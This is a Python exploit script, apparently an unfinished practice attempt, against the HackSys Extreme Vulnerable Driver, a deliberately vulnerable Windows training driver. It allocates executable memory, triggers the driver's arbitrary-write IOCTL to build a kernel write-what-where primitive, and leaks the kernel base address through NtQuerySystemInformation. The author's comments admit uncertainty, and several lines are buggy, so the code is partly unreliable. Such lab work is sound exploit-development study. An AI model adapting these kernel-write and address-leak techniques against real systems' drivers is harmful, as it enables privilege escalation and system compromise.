#!/usr/bin/python
# -*- coding: utf-8 -*-
import ctypes
import struct
import sys
import os
import time
import platform
from ctypes import *
from ctypes.wintypes import *

# easy definitions to save characters

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0
STATUS_SUCCESS = 0
MOVEFILE_REPLACE_EXISTING = 0x01
CREATE_SUSPENDED = 0x00000004
THREADFUNC = CFUNCTYPE(None)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_READWRITE = 0x00000004
ThreadBasicInformation = 0

# Windows API Function Defs + Extras

ntdll.NtAllocateVirtualMemory.argtypes = [
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    c_ulonglong,
    ]
kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong,
        c_char_p, c_ulonglong, POINTER(c_ulonglong)]
kernel32.DeviceIoControl.argtypes = [
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    POINTER(c_ulong),
    c_void_p,
    ]

# Added more definitions - read memory and also an API call for process information

kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
        c_size_t, POINTER(c_size_t)]
ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
        c_void_p, c_ulong, POINTER(c_ulonglong)]
STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

# Allocate memory to use for the HEVD Leak
# Easy to recognize arbitrary address

baseadd = c_ulonglong(0x000000001a000000)

# Some size

addsize = c_ulonglong(0x3000)

# The win32con may be fucked up, but I saw this in another exploit's source code using this same library I think it's ok.

dwStatus = ntdll.NtAllocateVirtualMemory(
    0xFFFFFFFFFFFFFFFF,
    byref(baseadd),
    0,
    byref(addsize),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    )

# If not zero (True), something didn't work.

if dwStatus != STATUS_SUCCESS:
    print ('Something went wrong while allocating memory', 'e')
    sys.exit()


def writeQWORD(driver, what=None, where=None):
    what_addr = 0x000000001a001000  # Arbitrary offset inside baseadd

    # Write the what value to what_addr

    data = struct.pack('<Q', what)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            what_addr, data, len(data), byref(written))

    if dwStatus == 0:
        print ('Something went wrong while writing to memory', 'e')
        sys.exit()

    # Pack the address of the what value and the where address

    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            0x000000001a000000, data, len(data), byref(written))
    if dwStatus == 0:
        print ('Something went wrong while writing to memory in the packing section'
               , 'e')
        sys.exit()

    # IOCTL

    IoControlCode = 0x0022200B

    # Where

    InputBuffer = c_void_p(0x000000001a000000)

    # I THINK this should work?

    InputBufferLength = 0x10  # can't take length of a void pointer len(InputBuffer)

    # If our buffer length is zero can't we set OutputBuffer to None?

    OutputBuffer = c_void_p(0)

    # The OutputBufferLength is already set to zero. I think we can get rid of this?

    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    print 'Value before DeviceIoControl: %08x' \
        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )
    print 'Value after: %08x' % cast(0x000000001a002000,
            POINTER(c_ulonglong))[0]
    return triggerIOCTL


def readQWORD(driver, what=None, where=None):

    # token finding code here

    print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
    sys_info = create_string_buffer()
    sys_info_len = c_ulong()

    ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info),
                                   addressof(sys_info_len))

    sys_info = create_string_buffer(sys_info_len.value)
    result = ntdll.NtQuerySystemInformation(0xb, sys_info,
            len(sys_info), addressof(sys_info_len))

    if result == 0:
        print '[*] Success, allocated {}-byte result buffer'.format(str(len(sys_info)))
    else:

        print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))


    class SYSTEM_MODULE_INFORMATION(Structure):

        _fields_ = [
            ('Reserved', c_void_p * 2),
            ('ImageBase', c_void_p),
            ('ImageSize', c_long),
            ('Flags', c_ulong),
            ('LoadOrderIndex', c_ushort),
            ('InitOrderIndex', c_ushort),
            ('LoadCount', c_ushort),
            ('ModuleNameOffset', c_ushort),
            ('ImageName', c_char * 256),
            ]

    # thanks GradiusX

    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))

    sys_info = create_string_buffer(sys_info.raw[8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter
                + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if 'ntoskrnl' or 'ntkrnl' in tmp.ImageName:
            img_name = tmp.ImageName.split('\\')[-0x01]
            print '[*] Kernel Type: {}'.format(img_name)
            kernel_base = hex(tmp.ImageBase)[:-0x01]
            print '[*] Kernel Base: {}'.format(kernel_base)

            return (img_name, kernel_base)

    counter += sizeof(tmp)


# Exploit the driver

def executeOverwrite():
    driver_handle = kernel32.CreateFileA(
        '\\\\.\\HackSysExtremeVulnerableDriver',
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        3,
        0,
        None,
        )
    if not driver_handle or driver_handle == -0x01:
        print '[!] Driver handle not found :(\n'
        sys.exit()
    else:
        print '[X] Got handle to the driver.\n'

    # This will not run until leakQWORD() definition problem is resolved.
        # readKernelValue()

        writeQWORD(driver_handle, 0x4142434445464748,
                   0x000000001a002000)
        readQWORD()


executeOverwrite()
